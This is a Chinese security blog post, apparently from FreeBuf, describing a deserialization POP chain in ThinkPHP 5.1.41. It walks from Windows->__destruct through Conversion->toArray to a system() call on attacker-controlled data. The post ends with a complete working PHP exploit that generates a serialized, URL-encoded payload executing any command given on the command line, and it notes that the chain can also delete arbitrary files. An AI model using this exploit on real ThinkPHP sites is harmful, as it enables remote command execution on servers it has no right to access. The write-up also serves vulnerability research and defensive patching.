**HW期间，为防范钓鱼，即日起FreeBuf将取消投稿文章的一切外部链接。给您带来的不便，敬请谅解~**

## TP5141 反序列化

    
    
    # Author: 4ut15m
    # Date: 2021年4月11日 22:45:46
    # Version: thinkphp v5.1.41LTS
    # Install: composer create-project topthink/think tp5141 5.1.41 --prefer-dist
    

晚上回顾tp以前反序列化漏洞的时候发现的，好像是一条新的POP链，没有在网上看见其他师傅发表这条链

## POP链

    
    
    Windows->__destruct	-->Windows->removeFiles		-->Conversion->__toString		-->Conversion->toJson		-->Conversion->toArray		-->Attribute->getAttr
    
    
    Conversion->Model
    Model->Pivot
    

先看命令执行处，若`$closure`、`$value`都可控，即可执行命令

![image-20210416164159181.png](https://image.3001.net/images/20210416/1618579946_607991ea23cad530e9bb5.png!small)

POP链首和tp5.0反序列化漏洞起点一样，Windows->__destruct

![image-20210416163417422.png](https://image.3001.net/images/20210416/1618579861_607991950b848d5ccf169.png!small)

Windows->removeFiles，控制Windows->files可以删除任意文件。

![image-20210416163508084.png](https://image.3001.net/images/20210416/1618579870_6079919ebe7be31484ef5.png!small)

file_exists函数可触发__toString魔术方法,找到Conversion的toString

![image-20210416163656592.png](https://image.3001.net/images/20210416/1618579880_607991a85149d307e6532.png!small)

![image-20210416163714317.png](https://image.3001.net/images/20210416/1618579888_607991b08392976ef8fdd.png!small)

跟进Conversion->toArray,`$this->append`可控

![image-20210416163823622.png](https://image.3001.net/images/20210416/1618579917_607991cdec20d64645a76.png!small)

跟进getRelation,使得该方法返回null即可进入if

![image-20210416164425792.png](https://image.3001.net/images/20210416/1618579971_60799203dad96735e9c9c.png!small)

跟进getAttr,发现关键点

![image-20210416164137045.png](https://image.3001.net/images/20210416/1618579932_607991dc2ed7227010dba.png!small)

要使代码执行到493行，需要设置`$this->withAttr[$fileName]`.`$closure`由`$this->withAttr[$fileName]`控制,`$this->withAttr`可控,`$fileName`由我们参数`$name`即我们传入的`$this->append`的key控制，也是可控的。

value由getData得到

![image-20210416165525936.png](https://image.3001.net/images/20210416/1618579980_6079920c88ed4345496dc.png!small)

代码第269行，如果`$this->data`中存在`$name`键，就将`$this->data[$name]`的值赋给value,$this->data与$name皆可控，故value可控

整理思路如下

    
    
    Conversion->append = ["4ut15m"=>[]]
    Conversion->relation = false
    Conversion->withAttr = ["4ut15m"=>"system"]
    Conversion->data = ["4ut15m"=>"cmd"]			//要执行的命令
    

因为convertion是trait类，所以只要找到一个使用了conversion的类即可，全局搜索conversion找到Model类

![image-20210416170012392.png](https://image.3001.net/images/20210416/1618579989_60799215ee78f5b2358a6.png!small)

由于Model是抽象类，我们得找到Model的实现类，全局搜索找到Pivot

![image-20210416170153151.png](https://image.3001.net/images/20210416/1618579996_6079921c60b19e8c4f12c.png!small)

至此可以编写exp

    
    
    Windows->files = new Pivot()
    Pivot->relation = false
    Pivot->data = ["4ut15m"=>"cmd"]		//要执行的命令
    Pivot->withAttr = ["4ut15m"=>"system"]
    

## exp

    
    
    <?php
    namespace think;
    abstract class Model{
        private $data = [];
        private $withAttr = [];
        protected $append = ['4ut15m'=>[]];
    
        public function __construct($cmd){
            $this->relation = false;
            $this->data = ['4ut15m'=>$cmd];		//任意值,value
            $this->withAttr = ['4ut15m'=>'system'];
        }
    }
    
    namespace think\model;
    use think\Model;
    class Pivot extends Model{
    }
    
    
    namespace think\process\pipes;
    use think\model\Pivot;
    class Windows{
        private $files = [];
    
        public function __construct($cmd){
            $this->files = [new Pivot($cmd)];		//Conversion类
        }
    
    }
    
    $windows = new Windows($argv[1]);
    echo urlencode(serialize($windows))."\n";
    
    
    ?>
    

在tp中加一个反序列化点

![image-20210416170610137.png](https://image.3001.net/images/20210416/1618580046_6079924ecc0cb01b866e9.png!small)

![image-20210416170432452.png](https://image.3001.net/images/20210416/1618580011_6079922b661ded8981348.png!small)

![1618803897_607cfcb99478d9429c758.png!small?1618803898173](https://image.3001.net/images/20210419/1618803897_607cfcb99478d9429c758.png!small?1618803898173)

![1618803877_607cfca51d738c722b354.png!small?1618803877600](https://image.3001.net/images/20210419/1618803877_607cfca51d738c722b354.png!small?1618803877600)

